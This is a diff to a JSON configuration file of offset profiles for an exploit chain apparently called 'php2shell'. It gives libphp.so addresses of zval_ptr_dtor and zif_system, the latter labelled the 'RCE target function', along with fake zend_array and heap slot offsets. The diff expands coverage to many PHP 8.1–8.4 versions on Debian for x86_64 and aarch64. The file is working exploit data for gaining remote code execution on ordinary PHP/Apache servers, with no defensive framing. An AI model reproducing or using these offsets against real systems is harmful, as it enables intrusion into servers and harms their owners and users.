@@ -1,23 +1,131 @@
 {
   "_comment": "Chain D offset profiles for php2shell. Keys: <php_version>-<sapi>-<distro>-<arch>",
   "_symbols": {
-    "zval_ptr_dtor": "offset of zval_ptr_dtor in libphp.so — used as pDestructor",
-    "zif_system": "offset of zif_system in libphp.so — RCE target function",
+    "zval_ptr_dtor": "offset of zval_ptr_dtor in libphp.so - used as pDestructor",
+    "zif_system": "offset of zif_system in libphp.so - RCE target function",
     "fake_array_S": "offset inside main heap chunk for fake zend_array placement",
     "hsv": "heap slot vector offset inside main heap chunk"
   },
   "profiles": {
     "8.4.26-apache-trixie-x86_64": {
-      "zval_ptr_dtor": "0x34FA10",
-      "zif_system": "0x388600",
+      "zval_ptr_dtor": "0x65EB60",
+      "zif_system": "0x465370",
       "fake_array_S": "0xF8398",
       "hsv": "0x7D720"
     },
-    "8.4.26-apache-trixie-aarch64": {
-      "zval_ptr_dtor": "0x2D2270",
-      "zif_system": "0x2FC138",
+    "8.4.26-apache-bookworm-x86_64": {
+      "zval_ptr_dtor": "0x64EB60",
+      "zif_system": "0x45A3B0",
       "fake_array_S": "0xF8398",
       "hsv": "0x7D720"
+    },
+    "8.3.35-apache-trixie-x86_64": {
+      "zval_ptr_dtor": "0x49EC50",
+      "zif_system": "0x3AC080",
+      "fake_array_S": "0xF8358",
+      "hsv": "0x7D6E0"
+    },
+    "8.3.35-apache-bookworm-x86_64": {
+      "zval_ptr_dtor": "0x493AC0",
+      "zif_system": "0x3A3020",
+      "fake_array_S": "0xF8358",
+      "hsv": "0x7D6E0"
+    },
+    "8.2.34-apache-bookworm-x86_64": {
+      "zval_ptr_dtor": "0x47C590",
+      "zif_system": "0x392E40",
+      "fake_array_S": "0xF8318",
+      "hsv": "0x7D6A0"
+    },
+    "8.4.25-apache-trixie-x86_64": {
+      "zval_ptr_dtor": "0x65DC60",
+      "zif_system": "0x464C70",
+      "fake_array_S": "0xF8398",
+      "hsv": "0x7D720"
+    },
+    "8.4.25-apache-bookworm-x86_64": {
+      "zval_ptr_dtor": "0x64E240",
+      "zif_system": "0x45A030",
+      "fake_array_S": "0xF8398",
+      "hsv": "0x7D720"
+    },
+    "8.2.33-apache-bookworm-x86_64": {
+      "zval_ptr_dtor": "0x47C010",
+      "zif_system": "0x392D00",
+      "fake_array_S": "0xF8318",
+      "hsv": "0x7D6A0"
+    },
+    "8.1.31-apache-bookworm-x86_64": {
+      "zval_ptr_dtor": "0x450100",
+      "zif_system": "0x36B050",
+      "fake_array_S": "0xF82D8",
+      "hsv": "0x7D660"
+    },
+    "8.1.31-apache-bullseye-x86_64": {
+      "zval_ptr_dtor": "0x44DC90",
+      "zif_system": "0x367BB0",
+      "fake_array_S": "0xF82D8",
+      "hsv": "0x7D660"
+    },
+    "8.4.26-apache-trixie-aarch64": {
+      "zval_ptr_dtor": "0x638120",
+      "zif_system": "0x42CD70",
+      "fake_array_S": "0xF8398",
+      "hsv": "0x7D720"
+    },
+    "8.4.26-apache-bookworm-aarch64": {
+      "zval_ptr_dtor": "0x631B00",
+      "zif_system": "0x428030",
+      "fake_array_S": "0xF8398",
+      "hsv": "0x7D720"
+    },
+    "8.3.35-apache-trixie-aarch64": {
+      "zval_ptr_dtor": "0x46FCC0",
+      "zif_system": "0x377428",
+      "fake_array_S": "0xF8358",
+      "hsv": "0x7D6E0"
+    },
+    "8.3.35-apache-bookworm-aarch64": {
+      "zval_ptr_dtor": "0x46AB60",
+      "zif_system": "0x3726E0",
+      "fake_array_S": "0xF8358",
+      "hsv": "0x7D6E0"
+    },
+    "8.2.34-apache-bookworm-aarch64": {
+      "zval_ptr_dtor": "0x45B9B0",
+      "zif_system": "0x36A4C0",
+      "fake_array_S": "0xF8318",
+      "hsv": "0x7D6A0"
+    },
+    "8.4.25-apache-trixie-aarch64": {
+      "zval_ptr_dtor": "0x637AE0",
+      "zif_system": "0x42FA30",
+      "fake_array_S": "0xF8398",
+      "hsv": "0x7D720"
+    },
+    "8.4.25-apache-bookworm-aarch64": {
+      "zval_ptr_dtor": "0x6332B0",
+      "zif_system": "0x426C70",
+      "fake_array_S": "0xF8398",
+      "hsv": "0x7D720"
+    },
+    "8.2.33-apache-bookworm-aarch64": {
+      "zval_ptr_dtor": "0x457470",
+      "zif_system": "0x369320",
+      "fake_array_S": "0xF8318",
+      "hsv": "0x7D6A0"
+    },
+    "8.1.31-apache-bookworm-aarch64": {
+      "zval_ptr_dtor": "0x428C10",
+      "zif_system": "0x33E8E0",
+      "fake_array_S": "0xF82D8",
+      "hsv": "0x7D660"
+    },
+    "8.1.31-apache-bullseye-aarch64": {
+      "zval_ptr_dtor": "0x429DA0",
+      "zif_system": "0x340DC0",
+      "fake_array_S": "0xF82D8",
+      "hsv": "0x7D660"
     }
   }
 }
